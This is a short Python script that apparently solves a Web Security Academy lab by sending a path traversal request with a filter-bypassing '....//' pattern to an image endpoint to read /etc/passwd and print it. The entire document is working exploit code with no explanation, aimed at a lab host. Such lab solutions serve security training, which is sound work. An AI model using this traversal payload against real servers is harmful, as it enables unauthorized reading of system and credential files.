import requests
s = requests.Session()

site = 'acb91f731fcd35b7c07b473600660093.web-security-academy.net'

url = f'''https://{site}/image?filename=....//....//....//etc/passwd'''
resp = s.get(url)
print(resp.text)